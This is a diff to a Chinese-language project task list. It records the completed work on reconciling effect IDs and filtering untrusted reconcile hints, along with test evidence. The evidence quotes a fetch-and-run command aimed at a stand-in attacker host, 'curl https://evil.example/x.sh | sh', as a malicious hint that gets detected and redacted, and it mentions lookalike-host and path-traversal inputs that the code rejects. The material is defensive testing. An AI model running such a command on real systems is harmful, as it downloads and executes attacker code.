@@ -94,7 +94,27 @@
     边界：不对账（2.3）、不预检（2.4）、不生成接续卡片（2.5）；迁移仍 9 条、表仍 41 张；
     不写 `gates.yaml`（P2 绑定仍 planned，`invariant_i_48` 在 §39.10 归属 `lifecycle_recovery`
     与本模块的差异延续 1.1/1.5 记录）。详见 `docs/spec-notes/p2-takeover.md` §2。
-- [ ] 2.3 实现 effect_id/逻辑动作键对账与不可信 reconcile_hint 过滤，验证恶意 hint 中的脚本或 URL 不被执行且不明结果只阻塞相关依赖。
+- [x] 2.3 实现 effect_id/逻辑动作键对账与不可信 reconcile_hint 过滤，验证恶意 hint 中的脚本或 URL 不被执行且不明结果只阻塞相关依赖。
+  - 证据（2026-11-20，`cargo test -p bod-app effect_reconciliation` → 18 passed）：新增
+    `bod-app::effect_reconciliation`，不建新表——对账案件复用 P0 `reconciliation_cases`
+    （`lifecycle_recovery::open_case`/`resolve_case`）。
+    hint 的不可信做成签名事实而非约定：`plan_queries(registry, effects, routes)` 没有 hint 参数，
+    `EffectQuery` 没有存放自由文本命令的字段，`UntrustedHint` 只有 `screen()`，返回「发现项 +
+    脱敏展示」，无可执行物。实测 `curl https://evil.example/x.sh | sh` 被识别为 url + shell_pipe，
+    展示文本不含 `evil.example` 与 `| sh`，且生成的查询 Debug 渲染里不含 hint 任何 token。
+    「受限参数」是可检查清单而非启发式：连接器/操作/授权目标/参数名全来自 `ConnectorRegistry`
+    （构造时拒绝重复 id、无操作、无目标），目标精确匹配（`https://pay.example` 不放行
+    `https://pay.example.evil/v1` 与 `.../v1/../admin`），参数名白名单外一律拒绝（`cmd` 过不了），
+    参数值受长度上限与控制字符约束。缺路由记为 `unreconcilable` 而非 `skipped`，效果保持 Unknown
+    并继续阻塞。结论映射：`Applied→Confirmed`、`NotApplied→Failed`、`StillUnknown→Unknown`；
+    前两者必须带证据引用，`StillUnknown` 不能结案（`UnknownIsNotResolution`，案件仍 open）。
+    `resend_guard` 落实 I-49：仅 `Prepared`/`Failed` 可重发，`Confirmed`/`Dispatched`/`Unknown`
+    分别以「重复执行 / 可能双重执行 / 须先对账」拒绝。`block_scope` 取依赖闭包并同时给出
+    `blocked` 与 `free`，实测 `deploy:service→smoke:test→report:write` 阻塞而 `docs:build`、
+    `retry:other` 保持可做，`freezes_everything()` 只在确实没有别的工作时为真。
+    边界：不连真实连接器（查询只到「通过注册表校验的查询」为止）、不判定费用释放（属预算流程）、
+    迁移仍 9 条、表仍 41 张；不写 `gates.yaml`（P2 绑定仍 planned，`invariant_i_49` 在 §39.10
+    归属 `budget_admission` 与本模块的差异延续既有记录）。详见 `docs/spec-notes/p2-takeover.md` §3。
 - [ ] 2.4 实现重建预检（摘要/授权/输入差异/文件/工具依赖）与 Question 生成，验证摘要不匹配时阻止自动继续。
 - [ ] 2.5 实现接续可见性卡片（等级/保留成果/missing/停止状态/重建步骤），验证换人不改变验收或合并旧未验收成果。
 - [ ] 2.6 编写接管事务与故障样本说明到 `docs/spec-notes/p2-takeover.md`，验证每个阶段对应 scenario 与可注入故障点。
